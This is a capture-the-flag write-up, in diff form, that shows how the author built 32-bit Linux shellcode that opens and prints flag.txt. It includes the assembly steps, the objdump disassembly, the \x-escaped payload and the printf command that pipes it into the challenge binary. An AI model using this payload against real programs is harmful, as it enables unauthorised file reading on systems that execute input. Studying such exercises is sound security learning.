@@ -1,0 +1,78 @@
+I HATE this problem
+Shellcode ain't pretty AT ALL
+
+First:
+So much credit goes to the person who posted this .asm code on StackOverflow:
+http://stackoverflow.com/questions/23125592/shellcode-c-program-harness
+
+This code basically prints out the contents of the file, with the filename listed at the end. I changed the 'key' to 'flag.txt'
+
+Then I needed to assemble the assembly code using nasm. If you don't have it, install it. You'll also need ld.
+
+> nasm -f elf cat_flag_txt.asm       // Assembles the .asm code into a .o file
+> ld -o cat_flag_txt cat_flag_txt.o  // Compiles the .o file??
+
+Now you have cat_flag_txt, which you run objdump on.
+
+> objdump -d cat_flag_txt
+
+And you get:
+============
+cat_flag_txt:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <top-0x2>:
+ 8048060:	eb 31                	jmp    8048093 <bottom>
+
+08048062 <top>:
+ 8048062:	5b                   	pop    %ebx
+ 8048063:	31 c9                	xor    %ecx,%ecx
+ 8048065:	31 c0                	xor    %eax,%eax
+ 8048067:	b0 05                	mov    $0x5,%al
+ 8048069:	cd 80                	int    $0x80
+ 804806b:	89 c3                	mov    %eax,%ebx
+ 804806d:	83 ec 01             	sub    $0x1,%esp
+ 8048070:	89 e1                	mov    %esp,%ecx
+ 8048072:	31 d2                	xor    %edx,%edx
+ 8048074:	42                   	inc    %edx
+
+08048075 <rwloop>:
+ 8048075:	31 c0                	xor    %eax,%eax
+ 8048077:	b0 03                	mov    $0x3,%al
+ 8048079:	cd 80                	int    $0x80
+ 804807b:	85 c0                	test   %eax,%eax
+ 804807d:	74 0d                	je     804808c <end>
+ 804807f:	53                   	push   %ebx
+ 8048080:	31 db                	xor    %ebx,%ebx
+ 8048082:	43                   	inc    %ebx
+ 8048083:	31 c0                	xor    %eax,%eax
+ 8048085:	b0 04                	mov    $0x4,%al
+ 8048087:	cd 80                	int    $0x80
+ 8048089:	5b                   	pop    %ebx
+ 804808a:	eb e9                	jmp    8048075 <rwloop>
+
+0804808c <end>:
+ 804808c:	31 db                	xor    %ebx,%ebx
+ 804808e:	31 c0                	xor    %eax,%eax
+ 8048090:	40                   	inc    %eax
+ 8048091:	cd 80                	int    $0x80
+
+08048093 <bottom>:
+ 8048093:	e8 ca ff ff ff       	call   8048062 <top>
+ 8048098:	66                   	data16
+ 8048099:	6c                   	insb   (%dx),%es:(%edi)
+ 804809a:	61                   	popa   
+ 804809b:	67 2e 74 78          	addr16 je,pn 8048117 <bottom+0x84>
+ 804809f:	74 00                	je     80480a1 <bottom+0xe>
+
+===========
+Now look at the hexadecimals in the middle section. Take all of them and combine them together, but also have the \x before each one.
+And you get:
+\xeb\x31\x5b\x31\xc9\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x83\xec\x01\x89\xe1\x31\xd2\x42\x31\xc0\xb0\x03\xcd\x80\x85\xc0\x74\x0d\x53\x31\xdb\x43\x31\xc0\xb0\x04\xcd\x80\x5b\xeb\xe9\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xca\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74\x00
+
+THIS IS THE PAYLOAD THAT YOU SEND INTO EXECUTE TO GET THE CONTENTS OF flag.txt
+
+> printf "\xeb\x31\x5b\x31\xc9\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x83\xec\x01\x89\xe1\x31\xd2\x42\x31\xc0\xb0\x03\xcd\x80\x85\xc0\x74\x0d\x53\x31\xdb\x43\x31\xc0\xb0\x04\xcd\x80\x5b\xeb\xe9\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xca\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74\x00" | ./execute 
+shellcode_is_kinda_cool
